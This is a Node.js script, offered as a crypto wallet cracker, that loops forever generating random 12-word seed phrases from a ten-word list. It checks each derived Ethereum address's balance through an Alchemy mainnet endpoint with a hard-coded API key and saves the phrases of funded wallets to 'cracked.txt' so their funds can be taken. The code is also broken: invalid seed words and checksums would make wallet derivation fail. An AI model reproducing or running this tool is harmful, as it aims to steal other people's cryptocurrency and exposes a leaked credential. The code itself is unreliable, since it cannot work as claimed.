const ethers = require("ethers");
const Web3   = require("web3");

const mnemonicWords = ['apple', 'banana', 'cat', 'dog', 'elephant', 'fish', 'grape', 'horse', 'iguana', 'jaguar'];

const api = 'https://eth-mainnet.g.alchemy.com/v2/oyHE_UtB3MYCGrZBaQNXzD1JDZMycYLf';
const provider = new Web3(new Web3.providers.HttpProvider(api));

async function main() {
  while(1){
    var mnemonic = generateMnemonic();
    var wallet = ethers.Wallet.fromMnemonic(mnemonic);
    var address = wallet.address;
    var balance = await provider.eth.getBalance(address);
    
    if (balance !== '0'){ // eth in this account
      // write mnemonic and address to cracked.txt
      const fs = require('fs');
      const content = mnemonic+'\n'+address+'\n';
      fs.appendFile('cracked.txt', content, err => {
        if (err) {
          console.error(err);
          return;
        }
      });
    }  
    console.log(address);
    console.log("balance: ", balance);
  }
}

function generateMnemonic(){
  let mnemonic = '';
  for(let i=0;i<12;i++){
    let index = Math.floor(Math.random() * mnemonicWords.length);
    mnemonic += mnemonicWords[index] + ' ';
  }
  return mnemonic.trim();
}

main()
  .then(() => {
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
